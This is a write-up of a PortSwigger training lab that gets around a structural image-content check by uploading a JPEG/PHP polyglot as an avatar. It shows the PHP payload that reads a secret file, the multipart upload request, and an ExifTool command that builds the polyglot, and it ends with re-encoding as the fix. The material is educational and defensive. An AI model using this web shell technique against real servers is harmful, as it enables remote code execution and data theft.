# Remote code execution via polyglot web shell upload

**Category:** File Upload
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

Every bypass in this series so far has attacked a check that never actually looked at the file's content — a header, a filename string, a null-terminated path. This lab closes that gap: the server calls something like `getimagesize()` or `exif_imagetype()`, which parses the file structure itself and confirms it's a genuine image. Beating that means the file has to *actually be* a valid image and a valid PHP script at the same time.

## The Target

The avatar upload endpoint, now validating file content rather than metadata. A file with fabricated JPEG magic bytes but no real image structure behind them was rejected outright — this check reads into the file, not just its first few bytes.

## The Investigation

Getting past a structural image check meant we needed a file that would parse as a legitimate JPEG all the way through — not just the magic bytes at the start — while still containing executable PHP somewhere the server would read as source. JPEG has a purpose-built place for exactly this kind of payload: the COM (comment) marker, `FF FE`, which the JPEG spec allows anywhere in the file and which image-parsing libraries treat as arbitrary metadata, not pixel data. Apache, on the other hand, doesn't care what's inside a `.php`-named file when deciding to hand it to the PHP interpreter — it just needs the extension and the PHP tags.

Our first attempt at a minimal hand-crafted JPEG — just magic bytes plus a COM marker, built by hand — still failed the content check with a 403; it wasn't a structurally complete JPEG, just a file that started with the right bytes. That confirmed the validation was genuinely parsing image structure (dimensions, encoding tables, etc.), not just sniffing the header. We rebuilt the approach around Pillow, generating an actual 1x1 pixel JPEG through a real image library so every part of the file the parser cares about — not just the first bytes — was structurally valid, then inserted our own COM marker into that real JPEG immediately after the SOI marker:

```
COM marker format: FF FE [2-byte length, big-endian] [comment bytes]
```

We used delimiter markers around the PHP output so we could cleanly extract our secret from a response otherwise full of binary JPEG bytes:

```php
<?php echo 'PAYLOAD_START'.file_get_contents('/home/carlos/secret').'PAYLOAD_END'; ?>
```

## The Exploit

The final file — a genuine 1x1 red-pixel JPEG generated with Pillow, with the delimited PHP payload injected into a COM marker right after the SOI bytes — was uploaded as `polyglot.php`:

```
POST /my-account/avatar
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: image/jpeg

<binary JPEG bytes><COM marker: FF FE [len] <?php echo 'PAYLOAD_START'.file_get_contents('/home/carlos/secret').'PAYLOAD_END'; ?>><rest of JPEG>
```

The content-inspection check parsed it as a legitimate image and accepted the upload; Apache served it by its `.php` extension. Fetching `GET /files/avatars/polyglot.php` executed the embedded PHP inline with the surrounding binary JPEG data. We extracted the secret from between our own `PAYLOAD_START`/`PAYLOAD_END` markers in the response and submitted it to solve the lab.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's solution builds the polyglot with a different tool — ExifTool — rather than a hand-rolled COM marker via Pillow: `exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <image>.jpg -o polyglot.php`. ExifTool writes the PHP payload into the JPEG's comment field on top of a real starting image, which is functionally the same target location as the COM marker we inserted manually — ExifTool's comment field *is* the JPEG COM marker under the hood. Their extraction step is also the same idea: search the raw response for the `START`/`END` delimiters to pull the secret out of the surrounding binary.

The real difference is how each of us produced a genuinely valid JPEG to carry the payload. PortSwigger starts from any real photo and lets ExifTool handle the metadata injection cleanly. We didn't have a starting image or ExifTool's specific comment-writing behavior as our first path, so we generated a minimal but fully valid JPEG programmatically with Pillow and inserted the COM marker ourselves at the byte level — which required first discovering, via a rejected hand-crafted attempt, that the check was validating real image structure and not just magic bytes. Both routes converge on the same underlying fact that makes this lab solvable: JPEG's comment segment is a legitimate place for arbitrary bytes that any spec-compliant image parser will skip over, and Apache doesn't care what a `.php` file's bytes look like as long as valid PHP tags are somewhere in them.

## What This Teaches Us

Validating file *structure* is a real improvement over validating headers or filenames, but it's still not validating *intent* — a file can be simultaneously a syntactically valid JPEG and a syntactically valid PHP script, because the two formats don't compete for the same bytes. JPEG's tolerance for arbitrary comment data and PHP's willingness to execute anything between `<?php` and `?>` regardless of what surrounds it are two independently reasonable design choices that combine into an exploitable gap. The fix that actually closes this is re-encoding: decoding the uploaded image into an in-memory bitmap and re-saving it fresh with a trusted library strips any injected metadata, because the new file is built from pixel data alone, with no comment segment for a payload to survive into.
